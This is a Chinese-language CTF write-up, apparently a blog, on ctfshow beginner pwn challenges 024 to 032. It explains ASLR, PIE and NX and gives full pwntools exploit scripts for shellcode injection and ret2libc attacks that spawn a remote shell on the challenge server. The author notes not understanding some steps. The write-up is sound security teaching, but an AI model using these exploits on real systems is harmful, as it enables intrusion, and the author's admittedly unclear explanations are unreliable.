<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">看汇编</span><br><span class="line">以下是ctfshow函数</span><br><span class="line"></span><br><span class="line">.text:080484C6                 public ctfshow</span><br><span class="line">.text:080484C6 ctfshow         proc near               ; CODE XREF: main+132↓p</span><br><span class="line">.text:080484C6</span><br><span class="line">.text:080484C6 buf             = byte ptr -88h</span><br><span class="line">.text:080484C6 var_4           = dword ptr -4</span><br><span class="line">.text:080484C6</span><br><span class="line">.text:080484C6 ; __unwind &#123;</span><br><span class="line">.text:080484C6                 push    ebp</span><br><span class="line">.text:080484C7                 mov     ebp, esp</span><br><span class="line">.text:080484C9                 push    ebx</span><br><span class="line">.text:080484CA                 sub     esp, 84h</span><br><span class="line">.text:080484D0                 call    __x86_get_pc_thunk_bx</span><br><span class="line">.text:080484D5                 add     ebx, (offset _GLOBAL_OFFSET_TABLE_ - $)</span><br><span class="line">.text:080484DB                 sub     esp, 4</span><br><span class="line">.text:080484DE                 push    100h            ; nbytes</span><br><span class="line">.text:080484E3                 lea     eax, [ebp+buf]</span><br><span class="line">.text:080484E9                 push    eax             ; buf</span><br><span class="line">.text:080484EA                 push    0               ; fd</span><br><span class="line">.text:080484EC                 call    _read</span><br><span class="line">.text:080484F1                 add     esp, 10h</span><br><span class="line">.text:080484F4                 sub     esp, 0Ch</span><br><span class="line">.text:080484F7                 lea     eax, [ebp+buf]</span><br><span class="line">.text:080484FD                 push    eax             ; s</span><br><span class="line">.text:080484FE                 call    _puts</span><br><span class="line">.text:08048503                 add     esp, 10h</span><br><span class="line">.text:08048506                 lea     eax, [ebp+buf]</span><br><span class="line">.text:0804850C                 call    eax</span><br><span class="line">.text:0804850E                 nop</span><br><span class="line">.text:0804850F                 mov     ebx, [ebp+var_4]</span><br><span class="line">.text:08048512                 leave</span><br><span class="line">.text:08048513                 retn</span><br><span class="line">.text:08048513 ; &#125; // starts at 80484C6</span><br><span class="line">.text:08048513 ctfshow         endp</span><br></pre></td></tr></table></figure>
<ol>
<li>
<p>函数开始时进行一些栈操作，保存寄存器的值。</p>
</li>
<li>
<p>调用 __x86_get_pc_thunk_bx 函数，获取当前的指令位置并存储在 ebx 寄存器中。</p>
</li>
<li>
<p>分配 0x84 字节的空间用于缓冲区，存储用户输入的数据。</p>
</li>
<li>
<p>调用 read 函数，从标准输入读取数据，并存储到缓冲区。</p>
</li>
<li>
<p>调用 puts 函数，将缓冲区的内容打印到标准输出。</p>
</li>
<li>
<p>通过调用 call eax 指令，以 eax 寄存器的值作为函数指针，跳转到缓冲区中存储的地址执行。</p>
</li>
<li>
<p>之后是一些清理工作和函数返回的准备操作</p>
</li>
</ol>
<ul>
<li>这题题目提示了可以使用pwntools的shellcraft模块进行攻击</li>
<li>shellcraft 模块是 pwntools 库中的一个子模块，用于生成各种不同体系结构的 Shellcode。</li>
<li>Shellcode 是一段以二进制形式编写的代码，用于利用软件漏洞、执行特定操作或获取系统权限。</li>
<li>shellcraft 模块提供了一系列函数和方法，用于生成特定体系结构下的 Shellcode</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *	 <span class="comment"># 导入 pwntools 库</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span>		 <span class="comment"># 设置日志级别为调试模式</span></span><br><span class="line"><span class="comment">#io = process(&#x27;./pwn&#x27;) 		# 本地连接</span></span><br><span class="line">io = remote(<span class="string">&quot;pwn.challenge.ctf.show&quot;</span>, <span class="number">28119</span>) 	<span class="comment"># 远程连接</span></span><br><span class="line">shellcode = asm(shellcraft.sh()) 		<span class="comment"># 生成一个 Shellcode</span></span><br><span class="line">io.sendline(shellcode)		 <span class="comment"># 将生成的 Shellcode 发送到目标主机</span></span><br><span class="line">io.interactive()		 <span class="comment"># 与目标主机进行交互</span></span><br></pre></td></tr></table></figure>
<h3 id="025-开启NX保护-ret2libc"><a class="header-anchor" href="#025-开启NX保护-ret2libc">¶</a>025 开启NX保护+ret2libc</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">checksec pwn</span><br><span class="line">[*] &#x27;/home/ctfshow/Desktop/ctfshow-pwn-primary/pwn025/pwn&#x27;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line">32位  开启NX保护  部分开启RELRO保护</span><br></pre></td></tr></table></figure>
<ul>
<li>开启NX保护，部分开启RELRO保护 → <code>具体攻击手法为：ret2libc</code></li>
<li>即先找到<strong>栈溢出</strong>漏洞，通过write函数泄露 write 函数的真实地址，根据<strong>泄露的 write 函数地址</strong>，使用 <strong>LibcSearcher</strong> 来搜索 <strong>libc 库</strong>中相应的函数地址和字符串地址，获取 <strong>system 函数</strong>和**“/bin/sh” 字符串的地址**。构造新的 payload，使用泄露的 system 函数和 “/bin/sh” 字符串的地址来进行<strong>get shell</strong></li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *  <span class="comment"># 用于漏洞利用</span></span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *  <span class="comment"># 用于查找libc版本中的符号地址</span></span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 远程连接</span></span><br><span class="line"><span class="comment">#io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line"><span class="comment">#io = remote(&#x27;127.0.0.1&#x27;,10000)</span></span><br><span class="line">io = remote(<span class="string">&quot;pwn.challenge.ctf.show&quot;</span>, <span class="number">28177</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)  <span class="comment"># 创建elf对象</span></span><br><span class="line">main = elf.sym[<span class="string">&#x27;main&#x27;</span>]  <span class="comment"># 获取main函数地址</span></span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]  <span class="comment"># 获取write GOT（全局偏移表）地址</span></span><br><span class="line">write_plt = elf.plt[<span class="string">&#x27;write&#x27;</span>]  <span class="comment"># 获取write PLT（过程链接表）地址</span></span><br><span class="line">payload = cyclic(<span class="number">0x88</span>+<span class="number">0x4</span>) + p32(write_plt) + p32(main) + p32(<span class="number">0</span>) + p32(write_got) + p32(<span class="number">4</span>)  <span class="comment"># 泄漏write函数在libc中的地址。这里使用了cyclic函数生成填充字节，p32函数将地址转换为小端字节序的字节串</span></span><br><span class="line"></span><br><span class="line"> <span class="comment"># 发送payload并接收响应</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line">write = u32(io.recv(<span class="number">4</span>)) </span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(write)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用LibcSearcher类查找与泄漏的write函数地址匹配的libc版本</span></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;write&#x27;</span>,write)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 计算libc库的基地址</span></span><br><span class="line">libc_base = write - libc.dump(<span class="string">&#x27;write&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取system和/bin/sh地址</span></span><br><span class="line">system = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">bin_sh = libc_base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"><span class="comment"># 使用已知的libc基地址和LibcSearcher类来获取system函数和/bin/sh字符串的地址</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 构造一个新的payload，这次是为了调用system函数并传递/bin/sh作为参数</span></span><br><span class="line">payload = cyclic(<span class="number">0x88</span>+<span class="number">0x4</span>) + p32(system) + p32(main) + p32(bin_sh)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 发送payload并等待响应，然后进入交互模式，允许用户与远程shell进行交互</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="026-ASLR-0"><a class="header-anchor" href="#026-ASLR-0">¶</a>026 ASLR  0</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">checksec pwn</span><br><span class="line">[*] &#x27;/home/ctfshow/Desktop/ctfshow-pwn-primary/pwn026/pwn&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line">64位 开启NX保护  部分开启RELRO保护  PIE未开启</span><br></pre></td></tr></table></figure>
<ul>
<li>
<p>ASLR（Address Space Layout Randomization）是一种操作系统级别的安全保护机制，旨在增加软件系统的安全性。</p>
</li>
<li>
<p>它通过**<u>随机化程序在内存中的布局</u><strong>，使得攻击者难以准确地</strong><u>确定关键代码和数据的位</u>**置，从而增加了利用软件漏洞进行攻击的难度</p>
</li>
<li>
<p>开启不同等级会有不同的效果：</p>
<ol>
<li>
<p>内存布局随机化： ASLR的主要目标是随机化程序的内存布局。在传统的内存布局中，不同的库和模块通常会在固定的内存位置上加载，攻击者可以利用这种可预测性来定位和利用漏洞。ASLR通过随机化这些模块的加载地址，使得攻击者无法准确地确定内存中的关键数据结构和代码的位置。</p>
</li>
<li>
<p>地址空间范围的随机化： ASLR还会随机化进程的地址空间范围。在传统的地址空间中，栈、堆、代码段和数据段通常会被分配到固定的地址范围中。ASLR会随机选择地址空间的起始位置和大小，从而使得这些重要的内存区域在每次运行时都有不同的位置。</p>
</li>
<li>
<p>随机偏移量： ASLR会引入随机偏移量，将程序和模块在内存中的相对位置随机化。这意味着每个模块的实际地址是相对于一个随机基址偏移的，而不是绝对地址。攻击者需要在运行时发现这些偏移量，才能准确地定位和利用漏洞。</p>
</li>
<li>
<p>堆和栈随机化： ASLR也会对堆和栈进行随机化。堆随机化会在每次分配内存时选择不同的起始地址，使得攻击者无法准确地预测堆上对象的位置。栈随机化会随机选择栈帧的起始位置，使得攻击者无法轻易地覆盖返回地址或控制程序流程</p>
</li>
</ol>
</li>
<li>
<p>在Linux中，ALSR的全局配置/proc/sys/kernel/randomize_va_space有三种情况：</p>
<ul>
<li>0表示关闭ALSR</li>
<li>1表示部分开启（将mmap的基址、stack和vdso页面随机化）</li>
<li>2表示完全开启</li>
</ul>
</li>
</ul>
<table>
<thead>
<tr>
<th>alsr</th>
<th>executable</th>
<th>plt</th>
<th>heap</th>
<th>stack</th>
<th>shared libraries</th>
</tr>
</thead>
<tbody>
<tr>
<td>0</td>
<td>x</td>
<td>x</td>
<td>x</td>
<td>x</td>
<td>x</td>
</tr>
<tr>
<td>1</td>
<td>x</td>
<td>x</td>
<td>x</td>
<td>√</td>
<td>√</td>
</tr>
<tr>
<td>2</td>
<td>x</td>
<td>x</td>
<td>√</td>
<td>√</td>
<td>√</td>
</tr>
<tr>
<td>2+PIE</td>
<td>√</td>
<td>√</td>
<td>√</td>
<td>√</td>
<td>√</td>
</tr>
</tbody>
</table>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./pwn</span><br><span class="line"></span><br><span class="line">cat /proc/sys/kernel/randomize_va_space</span><br><span class="line">&gt;&gt;&gt; 2</span><br><span class="line"></span><br><span class="line">echo 0 &gt; /proc/sys/kernel/randomize_va_space</span><br><span class="line"></span><br><span class="line">cat /proc/sys/kernel/randomize_va_space</span><br><span class="line">&gt;&gt;&gt; 0</span><br><span class="line"></span><br><span class="line">./pwn</span><br><span class="line">得到真的flag</span><br></pre></td></tr></table></figure>
<h3 id="027-ASLR-0-1"><a class="header-anchor" href="#027-ASLR-0-1">¶</a>027 ASLR 0/1</h3>
<ul>
<li>详细分析同026</li>
</ul>
<h3 id="028-ASLR-2"><a class="header-anchor" href="#028-ASLR-2">¶</a>028 ASLR 2</h3>
<ul>
<li>此时不管等级为0 1 2 ，函数本身地址不会变化（在未开启PIE的情况下）</li>
<li>详细分析同026</li>
</ul>
<h3 id="029-ASLR和PIE都开启"><a class="header-anchor" href="#029-ASLR和PIE都开启">¶</a>029 ASLR和PIE都开启</h3>
<ul>
<li>ASLR和PIE开启后，地址都会将随机化</li>
<li>这里值得注意的是，由于粒度问题，虽然地址都被随机化了，但是被随机化的都仅仅是某个对象的起始地址，而在其内部还是原来的结构</li>
<li>也就是相对偏移是不会变化的</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./pwn</span><br><span class="line"></span><br><span class="line">    * *************************************                           </span><br><span class="line">    * Classify: CTFshow --- PWN --- 入门                              </span><br><span class="line">    * Type  : Linux_Security_Mechanisms                               </span><br><span class="line">    * Site  : https://ctf.show/                                       </span><br><span class="line">    * Hint  : Please confirm your ASLR level first !                  </span><br><span class="line">    * *************************************                           </span><br><span class="line">sh: 1: cannot create /proc/sys/kernel/randomize_va_space: Permission denied</span><br><span class="line">Here is your ASLR level:</span><br><span class="line">2</span><br><span class="line"></span><br><span class="line">Let&#x27;s take a look at protection:</span><br><span class="line">[*] &#x27;/home/ctfshow/Desktop/ctfshow-pwn-primary/pwn029/pwn&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">executable: 0x5585483d383a</span><br><span class="line">system@plt: 0x7f8a6ad62420</span><br><span class="line">heap: 0x558549735260</span><br><span class="line">stack: 0x7ffc4481e7c4</span><br><span class="line"></span><br><span class="line">As you can see, the protection has been fully turned on and the address has been completely randomized!</span><br><span class="line"></span><br><span class="line">Here is your flag:</span><br><span class="line">ctfshow&#123;Address_Space_Layout_Randomization&amp;&amp;Position-Independent_Executable_1s_C0000000000l!&#125;</span><br></pre></td></tr></table></figure>
<h3 id="030-PIE关闭"><a class="header-anchor" href="#030-PIE关闭">¶</a>030 PIE关闭</h3>
<ul>
<li>关闭PIE</li>
<li>程序的基地址固定，攻击者可以更容易地确定内存中函数和变量的位置。</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">checksec pwn</span><br><span class="line">[*] &#x27;/home/ctfshow/Desktop/ctfshow-pwn-primary/pwn030/pwn&#x27;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line">32位  PIE关闭  开启NX  部分开启RELRO保护</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  ctfshow(&amp;argc);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048710);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048784);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048800);</span><br><span class="line">  <span class="built_in">puts</span>(asc_804888C);</span><br><span class="line">  <span class="built_in">puts</span>(asc_804891C);</span><br><span class="line">  <span class="built_in">puts</span>(asc_80489A0);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048A34);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * *************************************                           &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(aClassifyCtfsho);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Type  : Linux_Security_Mechanisms                               &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Site  : https://ctf.show/                                       &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Hint  : No Canary found &amp; No PIE &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * *************************************                           &quot;</span>);</span><br><span class="line">  write(<span class="number">0</span>, <span class="string">&quot;Hello CTFshow!\n&quot;</span>, <span class="number">0xE</span>u);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">ssize_t</span> <span class="title function_">ctfshow</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">132</span>]; <span class="comment">// [esp+0h] [ebp-88h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">0x100</span>u);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* buf ，用于存储从标准输入读取的数据。该变量在栈上分配，相对于函数栈帧指针 ebp 的偏移为-0x88 </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">调用 read 函数从标准输入读取数据。 read 函数的第一个参数是文件描述符，这里使用 0 表示标准输入。第二个参数是指向存储数据的缓冲区的指针，这里是 &amp;buf 。第三个参数是要读取的最大字节数，这里是 0x100u ，即 256 字节</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">程序中无system也没有“/bin/sh”字符串，也可以使用ret2libc的方法进行get shell 后面到该部分会进行详细讲解，同样在这里仅仅是为了演示在关闭Canary和PIE保护，开启NX保护时的一种攻击手法</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line"><span class="comment">#libc = ELF(&#x27;/lib/i386-linux-gnu/libc.so.6&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>, <span class="number">28145</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)  <span class="comment"># 创建elf对象</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;/home/ctfshow/libc/32bit/libc-2.27.so&#x27;</span>)</span><br><span class="line">ctfshow = elf.sym[<span class="string">&#x27;ctfshow&#x27;</span>]  <span class="comment"># 获取ctfshow函数的地址</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 构造payload以泄露write函数在libc中的地址</span></span><br><span class="line">payload = <span class="string">&quot;A&quot;</span> * <span class="number">140</span> +p32(elf.sym[<span class="string">&#x27;write&#x27;</span>]) + p32(ctfshow) + p32(<span class="number">1</span>) + p32(elf.got[<span class="string">&#x27;write&#x27;</span>]) + p32(<span class="number">4</span>)  <span class="comment"># 不是很懂。。</span></span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用泄漏的write地址来确定libc基地址，进而计算system函数和/bin/sh字符串的地址</span></span><br><span class="line">write_addr = u32(io.recv(<span class="number">4</span>))</span><br><span class="line">system_addr = write_addr - libc.sym[<span class="string">&#x27;write&#x27;</span>] + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh_addr = write_addr - libc.sym[<span class="string">&#x27;write&#x27;</span>] + <span class="built_in">next</span>(libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 构造新的payload，这次是调用system函数并传递/bin/sh作为参数</span></span><br><span class="line">payload2 = <span class="string">&quot;B&quot;</span> * <span class="number">140</span> + p32(system_addr) + p32(ctfshow) + p32(binsh_addr)</span><br><span class="line">io.send(payload2)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<ul>
<li>这题没太懂。</li>
<li>还差点前置知识喵。</li>
</ul>
<h3 id="031-ALSR和PIE开启"><a class="header-anchor" href="#031-ALSR和PIE开启">¶</a>031 ALSR和PIE开启</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">checksec pwn</span><br><span class="line">[*] &#x27;/home/ctfshow/Desktop/ctfshow-pwn-primary/pwn031/pwn&#x27;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">32位  仅关闭Canary保护</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%p\n&quot;</span>, main);  <span class="comment">// 程序先打印出main函数的地址</span></span><br><span class="line">  ctfshow(&amp;argc);</span><br><span class="line">  <span class="built_in">puts</span>(asc_854);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8C8);</span><br><span class="line">  <span class="built_in">puts</span>(asc_944);</span><br><span class="line">  <span class="built_in">puts</span>(asc_9D0);</span><br><span class="line">  <span class="built_in">puts</span>(asc_A60);</span><br><span class="line">  <span class="built_in">puts</span>(asc_AE4);</span><br><span class="line">  <span class="built_in">puts</span>(asc_B78);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * *************************************                           &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(aClassifyCtfsho);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Type  : Linux_Security_Mechanisms                               &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Site  : https://ctf.show/                                       &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Hint  : Bypass ALSR &amp; PIE &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * *************************************                           &quot;</span>);</span><br><span class="line">  write(<span class="number">0</span>, <span class="string">&quot;Hello CTFshow!\n&quot;</span>, <span class="number">0xE</span>u);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">ssize_t</span> <span class="title function_">ctfshow</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">132</span>]; <span class="comment">// [esp+0h] [ebp-88h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">0x100</span>u);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 有溢出，但是开启了保护，所以之前的exp打不了</span></span><br></pre></td></tr></table></figure>
<ul>
<li>已知main函数地址，可以通过计算偏移得到程序本身的加载地址</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 本地exp</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/i386-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 从程序输出中读取main函数的地址。通常，这一步需要在二进制程序中有特定的输出，以便读取main函数的地址</span></span><br><span class="line">main = <span class="built_in">int</span>(io.recvline(),<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 计算二进制文件的基地址，这是通过从读取到的main函数地址减去main函数在ELF文件中的偏移量得出的</span></span><br><span class="line">base = main - elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用基地址来计算ctfshow函数地址、write函数的PLT地址、write函数的GOT地址以及一个用于存放参数的寄存器（ebx）的地址</span></span><br><span class="line">ctfshow = base + elf.sym[<span class="string">&#x27;ctfshow&#x27;</span>]</span><br><span class="line">write_plt = base + elf.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_got = base + elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">ebx = base + <span class="number">0x1fc0</span>  <span class="comment"># 这个怎么得到的</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 构造payload来泄露write函数在libc中的地址</span></span><br><span class="line">payload = <span class="string">&quot;A&quot;</span> * <span class="number">132</span> + p32(ebx) + <span class="string">&quot;AAAA&quot;</span> + p32(write_plt) + p32(ctfshow) + p32(<span class="number">1</span>) + p32(write_got) + p32(<span class="number">4</span>)</span><br><span class="line">io.send(payload)</span><br><span class="line">write = u32(io.recv())  <span class="comment"># 这行不太懂。。</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用泄漏的write地址来确定libc基地址，进而计算system函数和/bin/sh字符串的地址</span></span><br><span class="line">libc_base = write - libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">system_addr = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh_addr = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 构造payload来调用system函数并传递/bin/sh作为参数</span></span><br><span class="line">payload = <span class="string">&quot;B&quot;</span> * <span class="number">140</span> + p32(system_addr) + p32(ctfshow) + p32(binsh_addr)</span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 远程exp</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line"><span class="comment">#io = remote(&#x27;127.0.0.1&#x27;,10000)</span></span><br><span class="line">io = remote(<span class="string">&quot;pwn.challenge.ctf.show&quot;</span>,<span class="number">28161</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&#x27;/lib/i386-linux-gnu/libc.so.6&#x27;)</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;/home/ctfshow/libc/32bit/libc-2.27.so&#x27;</span>)</span><br><span class="line">main = <span class="built_in">int</span>(io.recvline(),<span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(main)</span><br><span class="line"></span><br><span class="line">base = main - elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">ctfshow = base + elf.sym[<span class="string">&#x27;ctfshow&#x27;</span>]</span><br><span class="line">write_plt = base + elf.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_got = base + elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">ebx = base + <span class="number">0x1fc0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;A&quot;</span> * <span class="number">132</span> + p32(ebx) + <span class="string">&quot;AAAA&quot;</span> + p32(write_plt) + p32(ctfshow) + p32(<span class="number">1</span>) + p32(write_got) + p32(<span class="number">4</span>)</span><br><span class="line">io.send(payload)</span><br><span class="line">write = u32(io.recv())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">libc_base = write - libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">system_addr = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh_addr = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;B&quot;</span> * <span class="number">140</span> + p32(system_addr) + p32(ctfshow) + p32(binsh_addr)</span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="032-FORTIFY-SOURCE-0"><a class="header-anchor" href="#032-FORTIFY-SOURCE-0">¶</a>032 FORTIFY_SOURCE=0</h3>
<ul>
<li>
<p>禁用Fortify功能，不会进行任何额外的安全检查，可能导致潜在的安全漏洞</p>
</li>
<li>
<p>FORTIFY_SOURCE 是一个 C/C++ 编译器提供的安全保护机制，旨在<strong>防止缓冲区溢出</strong>和<strong>其他与字符串和内存操作相关</strong>的安全漏洞。它是在<strong>编译时自动插入</strong>的一组额外代码，用于增强程序对于缓冲区溢出和其他常见安全问题的防护。</p>
</li>
<li>
<p>FORTIFY_SOURCE 提供了以下主要功能：</p>
</li>
<li>
<p><strong>1. 运行时长度检查</strong></p>
<ul>
